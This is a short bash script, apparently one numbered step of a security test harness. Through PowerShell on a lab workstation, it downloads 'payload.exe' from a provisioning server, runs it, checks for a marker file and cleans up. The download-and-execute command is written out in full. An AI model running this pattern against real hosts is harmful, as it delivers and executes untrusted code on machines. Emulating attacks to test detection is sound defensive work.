#!/usr/bin/env bash
# H-06 EXE — download + execute payload from provisioning :8081
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/h-common.sh"
echo "=== H-06 Malicious EXE ==="
h_require_artifact "payload.exe"
h_ws01_exec "
\$ErrorActionPreference='Continue'
\$server='${H_WS01_HTTP}'
\$marker='C:\Windows\Temp\H-PAYLOAD-MARKER.txt'
Remove-Item \$marker -Force -ErrorAction SilentlyContinue
\$exe='C:\Windows\Temp\h06-payload.exe'
(New-Object Net.WebClient).DownloadFile(\"\$server/payload.exe\", \$exe)
Write-Output \"EXE_SIZE \$((Get-Item \$exe).Length)\"
Start-Process \$exe -ErrorAction SilentlyContinue
Start-Sleep -Seconds 6
if (Test-Path \$marker) { Write-Output 'H06_MARKER True'; Get-Content \$marker; Remove-Item \$marker -Force } else { Write-Output 'H06_MARKER False' }
Remove-Item \$exe -ErrorAction SilentlyContinue
Write-Output 'H06_DONE'
"
echo "H-06 complete"
